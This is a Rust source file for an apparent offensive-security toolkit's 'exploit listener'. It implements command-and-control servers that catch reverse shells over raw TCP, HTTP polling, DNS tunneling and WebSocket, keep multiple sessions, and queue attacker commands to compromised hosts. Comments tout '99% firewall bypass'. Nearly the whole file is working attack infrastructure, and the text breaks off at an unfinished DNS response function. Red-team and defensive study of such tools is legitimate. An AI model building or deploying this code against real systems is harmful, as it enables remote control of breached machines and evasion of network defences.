/// Exploit Listener - Receives reverse shell connections
///
/// ✅ ZERO DEPENDENCIES - Pure Rust TCP listener
///
/// **What Does This Do?**
/// - Listens for incoming reverse shell connections
/// - Manages multiple sessions simultaneously
/// - Provides interactive shell access
/// - Persists sessions to .rdb database
///
/// **Usage**:
/// ```bash
/// rb exploit listener start --port 4444
/// [*] Listener started on 0.0.0.0:4444
/// [+] Connection from 192.168.1.100:54321
/// shell> id
/// uid=33(www-data) gid=33(www-data)
/// ```
use std::collections::HashMap;
use std::io::{self, BufRead, Read, Write};
use std::net::{TcpListener, TcpStream, UdpSocket};
use std::sync::{mpsc, Arc, Mutex};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Base64 encoding/decoding for DNS tunneling (DNS-safe variant)
mod base64 {
    const BASE64_CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    /// Encode to DNS-safe base64 (replace + with -, / with _, remove =)
    pub fn encode_dns_safe(input: &str) -> String {
        let encoded = encode(input.as_bytes());
        encoded.replace('+', "-").replace('/', "_").replace('=', "")
    }

    /// Decode from DNS-safe base64
    pub fn decode_dns_safe(input: &str) -> Option<String> {
        // Restore standard base64 format
        let mut restored = input.replace('-', "+").replace('_', "/");

        // Add padding
        let padding = (4 - restored.len() % 4) % 4;
        for _ in 0..padding {
            restored.push('=');
        }

        decode(&restored)
    }

    /// Standard base64 encoding
    fn encode(input: &[u8]) -> String {
        let mut result = String::new();
        let mut i = 0;

        while i < input.len() {
            let b1 = input[i];
            let b2 = input.get(i + 1).copied().unwrap_or(0);
            let b3 = input.get(i + 2).copied().unwrap_or(0);

            let n = ((b1 as u32) << 16) | ((b2 as u32) << 8) | (b3 as u32);

            result.push(BASE64_CHARS[((n >> 18) & 63) as usize] as char);
            result.push(BASE64_CHARS[((n >> 12) & 63) as usize] as char);
            result.push(if i + 1 < input.len() {
                BASE64_CHARS[((n >> 6) & 63) as usize] as char
            } else {
                '='
            });
            result.push(if i + 2 < input.len() {
                BASE64_CHARS[(n & 63) as usize] as char
            } else {
                '='
            });

            i += 3;
        }

        result
    }

    /// Standard base64 decoding
    fn decode(input: &str) -> Option<String> {
        let input = input.as_bytes();
        let mut result = Vec::new();
        let mut i = 0;

        while i < input.len() {
            let c1 = char_to_value(input[i])?;
            let c2 = char_to_value(input.get(i + 1).copied().unwrap_or(b'A'))?;
            let c3 = if i + 2 < input.len() && input[i + 2] != b'=' {
                char_to_value(input[i + 2])?
            } else {
                0
            };
            let c4 = if i + 3 < input.len() && input[i + 3] != b'=' {
                char_to_value(input[i + 3])?
            } else {
                0
            };

            let n = ((c1 as u32) << 18) | ((c2 as u32) << 12) | ((c3 as u32) << 6) | (c4 as u32);

            result.push((n >> 16) as u8);
            if i + 2 < input.len() && input[i + 2] != b'=' {
                result.push((n >> 8) as u8);
            }
            if i + 3 < input.len() && input[i + 3] != b'=' {
                result.push(n as u8);
            }

            i += 4;
        }

        String::from_utf8(result).ok()
    }

    fn char_to_value(c: u8) -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'+' => Some(62),
            b'/' => Some(63),
            _ => None,
        }
    }
}

/// Session information
#[derive(Debug, Clone)]
pub struct Session {
    pub id: u32,
    pub stream: Arc<Mutex<TcpStream>>,
    pub peer_addr: String,
    pub session_type: String,
    pub started_at: u64,
    pub active: bool,
}

impl Session {
    /// Create new session
    pub fn new(id: u32, stream: TcpStream, session_type: String) -> Result<Self, String> {
        let peer_addr = stream
            .peer_addr()
            .map_err(|e| format!("Failed to get peer address: {}", e))?
            .to_string();

        let started_at = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_secs();

        Ok(Self {
            id,
            stream: Arc::new(Mutex::new(stream)),
            peer_addr,
            session_type,
            started_at,
            active: true,
        })
    }

    /// Send command to session
    pub fn send_command(&self, cmd: &str) -> Result<String, String> {
        let mut stream = self
            .stream
            .lock()
            .map_err(|e| format!("Failed to lock stream: {}", e))?;

        // Send command
        stream
            .write_all(cmd.as_bytes())
            .map_err(|e| format!("Failed to send command: {}", e))?;

        stream
            .write_all(b"\n")
            .map_err(|e| format!("Failed to send newline: {}", e))?;

        stream
            .flush()
            .map_err(|e| format!("Failed to flush stream: {}", e))?;

        // Read response
        let mut buffer = vec![0u8; 4096];
        let bytes_read = stream
            .read(&mut buffer)
            .map_err(|e| format!("Failed to read response: {}", e))?;

        let response = String::from_utf8_lossy(&buffer[..bytes_read]).to_string();
        Ok(response)
    }

    /// Check if session is still alive
    pub fn is_alive(&self) -> bool {
        self.active
    }

    /// Kill session
    pub fn kill(&mut self) {
        self.active = false;
    }
}

/// Session manager
pub struct SessionManager {
    sessions: Arc<Mutex<HashMap<u32, Session>>>,
    next_id: Arc<Mutex<u32>>,
}

impl SessionManager {
    /// Create new session manager
    pub fn new() -> Self {
        Self {
            sessions: Arc::new(Mutex::new(HashMap::new())),
            next_id: Arc::new(Mutex::new(1)),
        }
    }

    /// Add new session
    pub fn add_session(&self, stream: TcpStream, session_type: String) -> Result<u32, String> {
        let mut next_id = self
            .next_id
            .lock()
            .map_err(|e| format!("Failed to lock next_id: {}", e))?;

        let session_id = *next_id;
        *next_id += 1;
        drop(next_id);

        let session = Session::new(session_id, stream, session_type)?;

        let mut sessions = self
            .sessions
            .lock()
            .map_err(|e| format!("Failed to lock sessions: {}", e))?;

        sessions.insert(session_id, session);

        Ok(session_id)
    }

    /// Get session by ID
    pub fn get_session(&self, id: u32) -> Result<Session, String> {
        let sessions = self
            .sessions
            .lock()
            .map_err(|e| format!("Failed to lock sessions: {}", e))?;

        sessions
            .get(&id)
            .cloned()
            .ok_or_else(|| format!("Session {} not found", id))
    }

    /// List all sessions
    pub fn list_sessions(&self) -> Result<Vec<Session>, String> {
        let sessions = self
            .sessions
            .lock()
            .map_err(|e| format!("Failed to lock sessions: {}", e))?;

        Ok(sessions.values().cloned().collect())
    }

    /// Kill session
    pub fn kill_session(&self, id: u32) -> Result<(), String> {
        let mut sessions = self
            .sessions
            .lock()
            .map_err(|e| format!("Failed to lock sessions: {}", e))?;

        if let Some(session) = sessions.get_mut(&id) {
            session.kill();
            sessions.remove(&id);
            Ok(())
        } else {
            Err(format!("Session {} not found", id))
        }
    }
}

impl Default for SessionManager {
    fn default() -> Self {
        Self::new()
    }
}

/// Listener type
#[derive(Debug, Clone, PartialEq)]
pub enum ListenerType {
    Tcp,
    Http,
    Dns,
    WebSocket,
}

/// Exploit listener
pub struct ExploitListener {
    listener_type: ListenerType,
    port: u16,
    session_manager: SessionManager,
}

impl ExploitListener {
    /// Create new TCP listener
    pub fn new_tcp(port: u16) -> Self {
        Self {
            listener_type: ListenerType::Tcp,
            port,
            session_manager: SessionManager::new(),
        }
    }

    /// Create new HTTP listener
    pub fn new_http(port: u16) -> Self {
        Self {
            listener_type: ListenerType::Http,
            port,
            session_manager: SessionManager::new(),
        }
    }

    /// Create new DNS listener (99% firewall bypass!)
    pub fn new_dns(port: u16) -> Self {
        Self {
            listener_type: ListenerType::Dns,
            port,
            session_manager: SessionManager::new(),
        }
    }

    /// Create new WebSocket listener (99% firewall bypass - HTTP/HTTPS ports!)
    pub fn new_websocket(port: u16) -> Self {
        Self {
            listener_type: ListenerType::WebSocket,
            port,
            session_manager: SessionManager::new(),
        }
    }

    /// Start listening for connections
    pub fn start(&self) -> Result<(), String> {
        match self.listener_type {
            ListenerType::Tcp => self.start_tcp_listener(),
            ListenerType::Http => self.start_http_listener(),
            ListenerType::Dns => self.start_dns_listener(),
            ListenerType::WebSocket => self.start_websocket_listener(),
        }
    }

    /// Start TCP listener
    fn start_tcp_listener(&self) -> Result<(), String> {
        let bind_addr = format!("0.0.0.0:{}", self.port);
        let listener = TcpListener::bind(&bind_addr)
            .map_err(|e| format!("Failed to bind to {}: {}", bind_addr, e))?;

        println!("[*] TCP listener started on {}", bind_addr);
        println!("[*] Waiting for reverse shell connections...");

        for stream in listener.incoming() {
            match stream {
                Ok(stream) => {
                    let peer_addr = stream
                        .peer_addr()
                        .map(|addr| addr.to_string())
                        .unwrap_or_else(|_| "unknown".to_string());

                    println!("[+] Connection received from {}", peer_addr);

                    // Add session
                    match self
                        .session_manager
                        .add_session(stream, "tcp-reverse".to_string())
                    {
                        Ok(session_id) => {
                            println!("[+] Session {} opened (tcp-reverse)", session_id);
                            println!("[*] Type 'sessions' to list active sessions");
                            println!("[*] Type 'interact <ID>' to interact with a session");
                        }
                        Err(e) => {
                            eprintln!("[-] Failed to create session: {}", e);
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Connection error: {}", e);
                }
            }
        }

        Ok(())
    }

    /// Start HTTP listener (polling-based reverse shell)
    fn start_http_listener(&self) -> Result<(), String> {
        use std::collections::HashMap;

        let bind_addr = format!("0.0.0.0:{}", self.port);
        let listener = TcpListener::bind(&bind_addr)
            .map_err(|e| format!("Failed to bind to {}: {}", bind_addr, e))?;

        println!("[*] HTTP listener started on {}", bind_addr);
        println!("[*] Waiting for HTTP reverse shell connections...");
        println!("[*] Endpoints:");
        println!("    GET  /register - Register new session");
        println!("    GET  /cmd/<id> - Get command for session");
        println!("    POST /output/<id> - Receive command output");
        println!();

        // Command queue per session: session_id -> pending_command
        let mut command_queue: HashMap<u32, String> = HashMap::new();

        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    // Read HTTP request
                    let mut buffer = vec![0u8; 4096];
                    let bytes_read = stream
                        .read(&mut buffer)
                        .map_err(|e| format!("Failed to read request: {}", e))?;

                    let request = String::from_utf8_lossy(&buffer[..bytes_read]);
                    let lines: Vec<&str> = request.lines().collect();

                    if lines.is_empty() {
                        continue;
                    }

                    let request_line = lines[0];
                    let parts: Vec<&str> = request_line.split_whitespace().collect();

                    if parts.len() < 2 {
                        continue;
                    }

                    let method = parts[0];
                    let path = parts[1];

                    // Handle different endpoints
                    match (method, path) {
                        ("GET", "/register") => {
                            // New session registration
                            let peer_addr = stream
                                .peer_addr()
                                .map(|addr| addr.to_string())
                                .unwrap_or_else(|_| "unknown".to_string());

                            println!("[+] HTTP session registration from {}", peer_addr);

                            match self.session_manager.add_session(
                                stream.try_clone().unwrap(),
                                "http-reverse".to_string(),
                            ) {
                                Ok(session_id) => {
                                    println!("[+] Session {} opened (http-reverse)", session_id);

                                    // Send session ID response
                                    let response = format!(
                                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{}",
                                        session_id.to_string().len(),
                                        session_id
                                    );
                                    let _ = stream.write_all(response.as_bytes());
                                }
                                Err(e) => {
                                    eprintln!("[-] Failed to create session: {}", e);
                                    let response = "HTTP/1.1 500 Internal Server Error\r\n\r\n";
                                    let _ = stream.write_all(response.as_bytes());
                                }
                            }
                        }
                        ("GET", path) if path.starts_with("/cmd/") => {
                            // Get command for session
                            let session_id_str = path.trim_start_matches("/cmd/");
                            if let Ok(session_id) = session_id_str.parse::<u32>() {
                                // Check if there's a pending command
                                let cmd = command_queue
                                    .remove(&session_id)
                                    .unwrap_or_else(|| "sleep 5".to_string());

                                let response = format!(
                                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{}",
                                    cmd.len(),
                                    cmd
                                );
                                let _ = stream.write_all(response.as_bytes());
                            }
                        }
                        ("POST", path) if path.starts_with("/output/") => {
                            // Receive command output
                            let session_id_str = path.trim_start_matches("/output/");
                            if let Ok(session_id) = session_id_str.parse::<u32>() {
                                // Find body in request
                                if let Some(body_start) = request.find("\r\n\r\n") {
                                    let body = &request[body_start + 4..];
                                    println!("[*] Session {} output:\n{}", session_id, body.trim());
                                }

                                let response = "HTTP/1.1 200 OK\r\n\r\n";
                                let _ = stream.write_all(response.as_bytes());
                            }
                        }
                        _ => {
                            // Unknown endpoint
                            let response = "HTTP/1.1 404 Not Found\r\n\r\n";
                            let _ = stream.write_all(response.as_bytes());
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Connection error: {}", e);
                }
            }
        }

        Ok(())
    }

    /// Start DNS listener (DNS tunneling - 99% firewall bypass!)
    ///
    /// DNS tunneling works by encoding commands/output in DNS queries and responses.
    /// This bypasses almost all firewalls since DNS traffic is rarely blocked.
    fn start_dns_listener(&self) -> Result<(), String> {
        let bind_addr = format!("0.0.0.0:{}", self.port);
        let socket = UdpSocket::bind(&bind_addr)
            .map_err(|e| format!("Failed to bind to {}: {}", bind_addr, e))?;
        socket
            .set_read_timeout(Some(Duration::from_millis(500)))
            .map_err(|e| format!("Failed to set UDP timeout: {}", e))?;

        println!("[*] DNS listener started on {}", bind_addr);
        println!("[*] Waiting for DNS tunneling reverse shell connections...");
        println!("[*] DNS Query Format:");
        println!("    register.<session_id>.<domain> - Register new session");
        println!("    cmd.<session_id>.<domain>      - Get command (TXT record)");
        println!("    <data>.<session_id>.<domain>   - Send output data");

        // Session tracking
        // session_id -> (command_queue, output_buffer)
        let mut sessions: HashMap<String, (Vec<String>, String)> = HashMap::new();
        let mut buf = [0u8; 512]; // DNS max UDP size
        let (command_tx, command_rx) = mpsc::channel::<String>();

        thread::spawn(move || {
            let stdin = io::stdin();
            let mut reader = stdin.lock();

            loop {
                let mut line = String::new();
                match reader.read_line(&mut line) {
                    Ok(0) => break,
                    Ok(_) => {
                        let trimmed = line.trim();
                        if trimmed.is_empty() {
                            continue;
                        }
                        if command_tx.send(trimmed.to_string()).is_err() {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        loop {
            match socket.recv_from(&mut buf) {
                Ok((size, src)) => {
                    // Parse DNS query
                    if size < 12 {
                        continue; // Invalid DNS packet
                    }

                    // Extract transaction ID and flags
                    let txn_id = u16::from_be_bytes([buf[0], buf[1]]);
                    let _flags = u16::from_be_bytes([buf[2], buf[3]]);

                    // Parse domain name from question section
                    let mut offset = 12; // Skip header
                    let mut domain_labels = Vec::new();

                    while offset < size && buf[offset] != 0 {
                        let label_len = buf[offset] as usize;
                        offset += 1;

                        if offset + label_len > size {
                            break;
                        }

                        let label =
                            String::from_utf8_lossy(&buf[offset..offset + label_len]).to_string();
                        domain_labels.push(label);
                        offset += label_len;
                    }

                    if domain_labels.is_empty() {
                        continue;
                    }

                    // Join labels into full domain
                    let full_domain = domain_labels.join(".");

                    // Extract session ID (second-to-last label typically)
                    let session_id = if domain_labels.len() >= 2 {
                        domain_labels[domain_labels.len() - 2].clone()
                    } else {
                        "unknown".to_string()
                    };

                    // Extract first label (command type or data)
                    let first_label = domain_labels[0].clone();

                    // Handle different query types
                    if first_label == "register" {
                        // New session registration
                        println!(
                            "[+] DNS session registration from {} (session: {})",
                            src, session_id
                        );

                        // Initialize session
                        sessions
                            .entry(session_id.clone())
                            .or_insert((Vec::new(), String::new()));

                        // Send empty TXT response
                        let response = Self::build_dns_txt_response(txn_id, &full_domain, "ok");
                        let _ = socket.send_to(&response, src);
                    } else if first_label == "cmd" {
                        // Command request
                        if let Some((queue, _)) = sessions.get_mut(&session_id) {
                            // Get next command from queue or return "sleep"
                            let command = if queue.is_empty() {
                                "sleep".to_string()
                            } else {
                                queue.remove(0)
                            };

                            // Encode command in base64 (DNS-safe)
                            let cmd_b64 = base64::encode_dns_safe(&command);

                            println!("[*] Sending command to session {}: {}", session_id, command);

                            // Send TXT response with command
                            let response =
                                Self::build_dns_txt_response(txn_id, &full_domain, &cmd_b64);
                            let _ = socket.send_to(&response, src);
                        } else {
                            // Unknown session - send "sleep"
                            let response =
                                Self::build_dns_txt_response(txn_id, &full_domain, "c2xlZXA"); // "sleep" in base64
                            let _ = socket.send_to(&response, src);
                        }
                    } else {
                        // Data chunk from target
                        if let Some((_, output_buffer)) = sessions.get_mut(&session_id) {
                            // Decode base64 data from first label
                            if let Some(decoded) = base64::decode_dns_safe(&first_label) {
                                output_buffer.push_str(&decoded);

                                // Check if this is end of output (small chunk or ends with newline)
                                if first_label.len() < 60 || decoded.ends_with('\n') {
                                    println!(
                                        "[+] Output from session {}:\n{}",
                                        session_id,
                                        output_buffer.trim()
                                    );
                                    output_buffer.clear();
                                }
                            }

                            // Send empty response
                            let response = Self::build_dns_txt_response(txn_id, &full_domain, "");
                            let _ = socket.send_to(&response, src);
                        }
                    }

                    // Interactive command input (non-blocking check)
                    // TODO: Implement interactive shell via stdin reading
                    // For now, sessions are managed via session_manager
                }
                Err(e) => {
                    if e.kind() != io::ErrorKind::WouldBlock && e.kind() != io::ErrorKind::TimedOut
                    {
                        eprintln!("[-] DNS receive error: {}", e);
                    }
                }
            }

            while let Ok(line) = command_rx.try_recv() {
                let trimmed = line.trim();
                if trimmed.eq_ignore_ascii_case("sessions") {
                    if sessions.is_empty() {
                        println!("[*] No active DNS sessions yet");
                    } else {
                        println!("[*] Active DNS sessions:");
                        for key in sessions.keys() {
                            println!("    - {}", key);
                        }
                    }
                    continue;
                }

                let mut parts = trimmed.splitn(2, ' ');
                let session_label = match parts.next() {
                    Some(label) if !label.is_empty() => label,
                    _ => {
                        println!("[!] Command format: <session_id> <command>");
                        continue;
                    }
                };

                let command = match parts.next() {
                    Some(cmd) if !cmd.is_empty() => cmd,
                    _ => {
                        println!("[!] Command format: <session_id> <command>");
                        continue;
                    }
                };

                match sessions.get_mut(session_label) {
                    Some((queue, _)) => {
                        queue.push(command.to_string());
                        println!(
                            "[+] Queued command for session {}: {}",
                            session_label, command
                        );
                    }
                    None => println!(
                        "[!] Unknown session '{}' – type 'sessions' to list active IDs",
                        session_label
                    ),
                }
            }
        }
    }

    /// Start WebSocket listener (RFC 6455 - 99% firewall bypass!)
    ///
    /// WebSocket works by:
    /// 1. HTTP Upgrade handshake
    /// 2. Frame-based binary protocol
    /// 3. Persistent bidirectional connection
    /// 4. Uses HTTP/HTTPS ports (80/443) - bypasses firewalls!
    fn start_websocket_listener(&self) -> Result<(), String> {
        let bind_addr = format!("0.0.0.0:{}", self.port);
        let listener = TcpListener::bind(&bind_addr)
            .map_err(|e| format!("Failed to bind to {}: {}", bind_addr, e))?;

        println!("[*] WebSocket listener started on {}", bind_addr);
        println!("[*] Waiting for WebSocket reverse shell connections...");
        println!("[*] Protocol: RFC 6455 (WebSocket)");
        println!("[*] Handshake: HTTP Upgrade → WebSocket");
        println!();

        for stream in listener.incoming() {
            match stream {
                Ok(mut stream) => {
                    let peer_addr = stream
                        .peer_addr()
                        .map(|addr| addr.to_string())
                        .unwrap_or_else(|_| "unknown".to_string());

                    println!("[+] WebSocket connection from {}", peer_addr);

                    // Perform WebSocket handshake
                    match Self::websocket_handshake(&mut stream) {
                        Ok(()) => {
                            println!("[+] WebSocket handshake complete!");

                            // Add session
                            match self.session_manager.add_session(
                                stream.try_clone().unwrap(),
                                "websocket-reverse".to_string(),
                            ) {
                                Ok(session_id) => {
                                    println!(
                                        "[+] Session {} opened (websocket-reverse)",
                                        session_id
                                    );

                                    // Handle WebSocket frames in separate thread
                                    let stream_clone = stream.try_clone().unwrap();
                                    thread::spawn(move || {
                                        Self::handle_websocket_session(stream_clone, session_id)
                                    });
                                }
                                Err(e) => {
                                    eprintln!("[-] Failed to create session: {}", e);
                                }
                            }
                        }
                        Err(e) => {
                            eprintln!("[-] WebSocket handshake failed: {}", e);
                        }
                    }
                }
                Err(e) => {
                    eprintln!("[-] Connection error: {}", e);
                }
            }
        }

        Ok(())
    }

    /// Perform WebSocket handshake (RFC 6455)
    ///
    /// The handshake is an HTTP Upgrade request:
    /// ```
    /// GET / HTTP/1.1
    /// Upgrade: websocket
    /// Connection: Upgrade
    /// Sec-WebSocket-Key: <base64-encoded-key>
    /// Sec-WebSocket-Version: 13
    /// ```
    ///
    /// Response:
    /// ```
    /// HTTP/1.1 101 Switching Protocols
    /// Upgrade: websocket
    /// Connection: Upgrade
    /// Sec-WebSocket-Accept: <sha1(key + magic)>
    /// ```
    fn websocket_handshake(stream: &mut TcpStream) -> Result<(), String> {
        // Read HTTP request
        let mut buffer = vec![0u8; 4096];
        let bytes_read = stream
            .read(&mut buffer)
            .map_err(|e| format!("Failed to read handshake: {}", e))?;

        let request = String::from_utf8_lossy(&buffer[..bytes_read]);

        // Extract Sec-WebSocket-Key
        let key = request
            .lines()
            .find(|line| line.starts_with("Sec-WebSocket-Key:"))
            .and_then(|line| line.split(':').nth(1))
            .map(|k| k.trim())
            .ok_or("Missing Sec-WebSocket-Key header")?;

        // Compute Sec-WebSocket-Accept (SHA-1 hash of key + magic string)
        // Magic string defined in RFC 6455
        let magic = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
        let accept_key = Self::compute_websocket_accept(key, magic)?;

        // Send HTTP 101 Switching Protocols response
        let response = format!(
            "HTTP/1.1 101 Switching Protocols\r\n\
             Upgrade: websocket\r\n\
             Connection: Upgrade\r\n\
             Sec-WebSocket-Accept: {}\r\n\
             \r\n",
            accept_key
        );

        stream
            .write_all(response.as_bytes())
            .map_err(|e| format!("Failed to send handshake response: {}", e))?;

        stream
            .flush()
            .map_err(|e| format!("Failed to flush stream: {}", e))?;

        Ok(())
    }

    /// Compute Sec-WebSocket-Accept header value (RFC 6455)
    ///
    /// Formula: base64(SHA1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))
    ///
    /// We implement SHA-1 from scratch (ZERO dependencies!)
    fn compute_websocket_accept(key: &str, magic: &str) -> Result<String, String> {
        let combined = format!("{}{}", key, magic);
        let hash = Self::sha1(combined.as_bytes());
        Ok(Self::base64_encode(&hash))
    }

    /// SHA-1 implementation (RFC 3174) - ZERO dependencies!
    ///
    /// This is a pure Rust implementation of SHA-1 hash function.
    /// SHA-1 produces a 160-bit (20-byte) hash value.
    fn sha1(data: &[u8]) -> [u8; 20] {
        // Initialize hash values (first 32 bits of the fractional parts of the square roots of the first 5 primes)
        let mut h0: u32 = 0x67452301;
        let mut h1: u32 = 0xEFCDAB89;
        let mut h2: u32 = 0x98BADCFE;
        let mut h3: u32 = 0x10325476;
        let mut h4: u32 = 0xC3D2E1F0;

        // Pre-processing: add padding
        let mut padded = data.to_vec();
        let original_len_bits = (data.len() as u64) * 8;

        // Append bit '1' (as byte 0x80)
        padded.push(0x80);

        // Append zeros until message length ≡ 448 (mod 512)
        while (padded.len() % 64) != 56 {
            padded.push(0);
        }

        // Append original message length as 64-bit big-endian
        padded.extend_from_slice(&original_len_bits.to_be_bytes());

        // Process message in 512-bit (64-byte) chunks
        for chunk in padded.chunks(64) {
            let mut w = [0u32; 80];

            // Break chunk into sixteen 32-bit big-endian words
            for i in 0..16 {
                w[i] = u32::from_be_bytes([
                    chunk[i * 4],
                    chunk[i * 4 + 1],
                    chunk[i * 4 + 2],
                    chunk[i * 4 + 3],
                ]);
            }

            // Extend the sixteen 32-bit words into eighty 32-bit words
            for i in 16..80 {
                w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
            }

            // Initialize working variables
            let mut a = h0;
            let mut b = h1;
            let mut c = h2;
            let mut d = h3;
            let mut e = h4;

            // Main loop
            for i in 0..80 {
                let (f, k) = match i {
                    0..=19 => ((b & c) | ((!b) & d), 0x5A827999),
                    20..=39 => (b ^ c ^ d, 0x6ED9EBA1),
                    40..=59 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDC),
                    60..=79 => (b ^ c ^ d, 0xCA62C1D6),
                    _ => unreachable!(),
                };

                let temp = a
                    .rotate_left(5)
                    .wrapping_add(f)
                    .wrapping_add(e)
                    .wrapping_add(k)
                    .wrapping_add(w[i]);

                e = d;
                d = c;
                c = b.rotate_left(30);
                b = a;
                a = temp;
            }

            // Add this chunk's hash to result so far
            h0 = h0.wrapping_add(a);
            h1 = h1.wrapping_add(b);
            h2 = h2.wrapping_add(c);
            h3 = h3.wrapping_add(d);
            h4 = h4.wrapping_add(e);
        }

        // Produce the final hash value (big-endian) as a 160-bit number
        let mut hash = [0u8; 20];
        hash[0..4].copy_from_slice(&h0.to_be_bytes());
        hash[4..8].copy_from_slice(&h1.to_be_bytes());
        hash[8..12].copy_from_slice(&h2.to_be_bytes());
        hash[12..16].copy_from_slice(&h3.to_be_bytes());
        hash[16..20].copy_from_slice(&h4.to_be_bytes());

        hash
    }

    /// Base64 encoding - ZERO dependencies!
    fn base64_encode(data: &[u8]) -> String {
        const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut result = String::new();

        for chunk in data.chunks(3) {
            let b1 = chunk[0];
            let b2 = chunk.get(1).copied().unwrap_or(0);
            let b3 = chunk.get(2).copied().unwrap_or(0);

            let n = ((b1 as u32) << 16) | ((b2 as u32) << 8) | (b3 as u32);

            result.push(CHARS[((n >> 18) & 63) as usize] as char);
            result.push(CHARS[((n >> 12) & 63) as usize] as char);
            result.push(if chunk.len() > 1 {
                CHARS[((n >> 6) & 63) as usize] as char
            } else {
                '='
            });
            result.push(if chunk.len() > 2 {
                CHARS[(n & 63) as usize] as char
            } else {
                '='
            });
        }

        result
    }

    /// Handle WebSocket session (decode frames, send commands)
    fn handle_websocket_session(mut stream: TcpStream, session_id: u32) {
        println!("[*] Handling WebSocket session {}", session_id);

        loop {
            // Read WebSocket frame
            match Self::read_websocket_frame(&mut stream) {
                Ok(Some(payload)) => {
                    // Decode UTF-8 text from payload
                    let text = String::from_utf8_lossy(&payload);
                    println!("[+] Session {} output:\n{}", session_id, text.trim());

                    // Send response (for now, just echo or send "id" command)
                    let response = "id\n";
                    if let Err(e) = Self::send_websocket_frame(&mut stream, response.as_bytes()) {
                        eprintln!("[-] Failed to send WebSocket frame: {}", e);
                        break;
                    }
                }
                Ok(None) => {
                    // Connection closed
                    println!("[-] Session {} closed", session_id);
                    break;
                }
                Err(e) => {
                    eprintln!("[-] Error reading WebSocket frame: {}", e);
                    break;
                }
            }
        }
    }

    /// Read WebSocket frame (RFC 6455)
    ///
    /// Frame format:
    /// ```
    ///  0                   1                   2                   3
    ///  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
    /// +-+-+-+-+-------+-+-------------+-------------------------------+
    /// |F|R|R|R| opcode|M| Payload len |    Extended payload length    |
    /// |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
    /// |N|V|V|V|       |S|             |   (if payload len==126/127)   |
    /// | |1|2|3|       |K|             |                               |
    /// +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
    /// |     Extended payload length continued, if payload len == 127  |
    /// + - - - - - - - - - - - - - - - +-------------------------------+
    /// |                               |Masking-key, if MASK set to 1  |
    /// +-------------------------------+-------------------------------+
    /// | Masking-key (continued)       |          Payload Data         |
    /// +-------------------------------- - - - - - - - - - - - - - - - +
    /// :                     Payload Data continued ...                :
    /// + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
    /// |                     Payload Data continued ...                |
    /// +---------------------------------------------------------------+
    /// ```
    fn read_websocket_frame(stream: &mut TcpStream) -> Result<Option<Vec<u8>>, String> {
        // Read first 2 bytes (FIN, opcode, mask, payload length)
        let mut header = [0u8; 2];
        match stream.read_exact(&mut header) {
            Ok(_) => {}
            Err(_) => return Ok(None), // Connection closed
        }

        let fin = (header[0] & 0x80) != 0;
        let opcode = header[0] & 0x0F;
        let masked = (header[1] & 0x80) != 0;
        let mut payload_len = (header[1] & 0x7F) as u64;

        // Handle extended payload length
        if payload_len == 126 {
            let mut len_bytes = [0u8; 2];
            stream
                .read_exact(&mut len_bytes)
                .map_err(|e| format!("Failed to read extended payload length: {}", e))?;
            payload_len = u16::from_be_bytes(len_bytes) as u64;
        } else if payload_len == 127 {
            let mut len_bytes = [0u8; 8];
            stream
                .read_exact(&mut len_bytes)
                .map_err(|e| format!("Failed to read extended payload length: {}", e))?;
            payload_len = u64::from_be_bytes(len_bytes);
        }

        // Read masking key (4 bytes) if masked
        let masking_key = if masked {
            let mut key = [0u8; 4];
            stream
                .read_exact(&mut key)
                .map_err(|e| format!("Failed to read masking key: {}", e))?;
            Some(key)
        } else {
            None
        };

        // Read payload
        let mut payload = vec![0u8; payload_len as usize];
        stream
            .read_exact(&mut payload)
            .map_err(|e| format!("Failed to read payload: {}", e))?;

        // Unmask payload if masked
        if let Some(key) = masking_key {
            for (i, byte) in payload.iter_mut().enumerate() {
                *byte ^= key[i % 4];
            }
        }

        // Handle opcode
        match opcode {
            0x1 => Ok(Some(payload)), // Text frame
            0x2 => Ok(Some(payload)), // Binary frame
            0x8 => Ok(None),          // Close frame
            0x9 => {
                // Ping frame - send pong
                Self::send_websocket_frame(stream, &payload)?;
                Self::read_websocket_frame(stream) // Read next frame
            }
            0xA => Self::read_websocket_frame(stream), // Pong frame - ignore
            _ => Err(format!("Unknown WebSocket opcode: {}", opcode)),
        }
    }

    /// Send WebSocket frame (RFC 6455)
    fn send_websocket_frame(stream: &mut TcpStream, payload: &[u8]) -> Result<(), String> {
        let mut frame = Vec::new();

        // FIN=1, RSV=0, opcode=0x1 (text frame)
        frame.push(0x81);

        // Payload length
        let payload_len = payload.len();
        if payload_len < 126 {
            frame.push(payload_len as u8);
        } else if payload_len < 65536 {
            frame.push(126);
            frame.extend_from_slice(&(payload_len as u16).to_be_bytes());
        } else {
            frame.push(127);
            frame.extend_from_slice(&(payload_len as u64).to_be_bytes());
        }

        // Payload (server-to-client frames are NOT masked)
        frame.extend_from_slice(payload);

        stream
            .write_all(&frame)
            .map_err(|e| format!("Failed to send WebSocket frame: {}", e))?;

        stream
            .flush()
            .map_err(|e| format!("Failed to flush stream: {}", e))?;

        Ok(())
    }

    /// Build DNS TXT response
